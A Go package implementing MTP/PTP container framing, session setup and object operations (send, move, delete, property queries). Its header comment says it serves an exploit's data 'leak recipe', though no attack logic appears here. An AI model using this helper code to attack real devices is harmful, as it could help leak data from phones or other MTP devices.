// Package mtp implements the slice of MTP/PTP the exploit needs: container
// framing, session setup and the object operations used by the leak recipe.
package mtp

import (
	"encoding/binary"
	"fmt"
	"unicode/utf16"
)

// Container types.
const (
	TypeCommand  = 1
	TypeData     = 2
	TypeResponse = 3
)

// Operation codes.
const (
	OpGetDeviceInfo      = 0x1001
	OpOpenSession        = 0x1002
	OpCloseSession       = 0x1003
	OpGetObjectHandles   = 0x1007
	OpDeleteObject       = 0x100B
	OpSendObjectInfo     = 0x100C
	OpSendObject         = 0x100D
	OpMoveObject         = 0x1019
	OpGetObjectPropValue = 0x9803
)

// Response and object constants.
const (
	RespOK           = 0x2001
	RespNameConflict = 0x2002
	RespSessionOpen  = 0x201E
	StoreInternal    = 0x10001
	ObjectHandleRoot = 0xFFFFFFFF
	FormatAssoc      = 0x3001
	FormatFile       = 0x3801
	PropObjectName   = 0xDC08
)

// maxContainer caps the container length accepted off the wire.
const maxContainer = 16 << 20

// Container wraps a payload in an MTP container header.
func Container(typ, code uint16, tid uint32, payload []byte) []byte {
	pkt := make([]byte, 12+len(payload))
	binary.LittleEndian.PutUint32(pkt[0:], uint32(len(pkt)))
	binary.LittleEndian.PutUint16(pkt[4:], typ)
	binary.LittleEndian.PutUint16(pkt[6:], code)
	binary.LittleEndian.PutUint32(pkt[8:], tid)
	copy(pkt[12:], payload)
	return pkt
}

// Command builds a command container from uint32 parameters.
func Command(code uint16, tid uint32, params []uint32) []byte {
	payload := make([]byte, 4*len(params))
	for i, p := range params {
		binary.LittleEndian.PutUint32(payload[4*i:], p)
	}
	return Container(TypeCommand, code, tid, payload)
}

func Data(code uint16, tid uint32, payload []byte) []byte {
	return Container(TypeData, code, tid, payload)
}

// Packet is a parsed MTP container.
type Packet struct {
	Type    uint16
	Code    uint16
	TID     uint32
	Payload []byte
}

// Parse splits a raw container into header fields and payload.
func Parse(pkt []byte) (Packet, error) {
	if len(pkt) < 12 {
		return Packet{}, fmt.Errorf("short MTP container (%d bytes)", len(pkt))
	}
	ln := binary.LittleEndian.Uint32(pkt[0:])
	if ln < 12 || ln > maxContainer {
		return Packet{}, fmt.Errorf("bad MTP container length %d", ln)
	}
	if int(ln) > len(pkt) {
		return Packet{}, fmt.Errorf("truncated MTP container: want %d, have %d", ln, len(pkt))
	}
	return Packet{
		Type:    binary.LittleEndian.Uint16(pkt[4:]),
		Code:    binary.LittleEndian.Uint16(pkt[6:]),
		TID:     binary.LittleEndian.Uint32(pkt[8:]),
		Payload: pkt[12:ln],
	}, nil
}

// Params decodes a response payload as uint32 parameters.
func (p Packet) Params() []uint32 {
	out := make([]uint32, 0, len(p.Payload)/4)
	for i := 0; i+4 <= len(p.Payload); i += 4 {
		out = append(out, binary.LittleEndian.Uint32(p.Payload[i:]))
	}
	return out
}

// MTPString encodes a string as an MTP string (count-prefixed UTF-16LE).
func MTPString(s string) []byte {
	if s == "" {
		return []byte{0}
	}
	units := utf16.Encode([]rune(s))
	out := make([]byte, 0, 1+2*(len(units)+1))
	out = append(out, byte(len(units)+1))
	for _, u := range units {
		out = binary.LittleEndian.AppendUint16(out, u)
	}
	out = binary.LittleEndian.AppendUint16(out, 0)
	return out
}

// ObjectInfo encodes an MTP ObjectInfo dataset for a file or folder.
func ObjectInfo(storageID uint32, format uint16, parent uint32, name string, size uint32, assocType uint16) []byte {
	var out []byte
	out = binary.LittleEndian.AppendUint32(out, storageID)
	out = binary.LittleEndian.AppendUint16(out, format)
	out = binary.LittleEndian.AppendUint16(out, 0) // protection status
	out = binary.LittleEndian.AppendUint32(out, size)
	out = binary.LittleEndian.AppendUint16(out, 0) // thumbnail format
	out = binary.LittleEndian.AppendUint32(out, 0) // thumbnail size
	out = binary.LittleEndian.AppendUint32(out, 0) // thumbnail width
	out = binary.LittleEndian.AppendUint32(out, 0) // thumbnail height
	out = binary.LittleEndian.AppendUint32(out, 0) // image width
	out = binary.LittleEndian.AppendUint32(out, 0) // image height
	out = binary.LittleEndian.AppendUint32(out, 0) // image bit depth
	out = binary.LittleEndian.AppendUint32(out, parent)
	out = binary.LittleEndian.AppendUint16(out, assocType)
	out = binary.LittleEndian.AppendUint32(out, 0) // association description
	out = binary.LittleEndian.AppendUint32(out, 0) // sequence number
	out = append(out, MTPString(name)...)
	out = append(out, MTPString("")...)
	out = append(out, MTPString("")...)
	out = append(out, MTPString("")...)
	return out
}
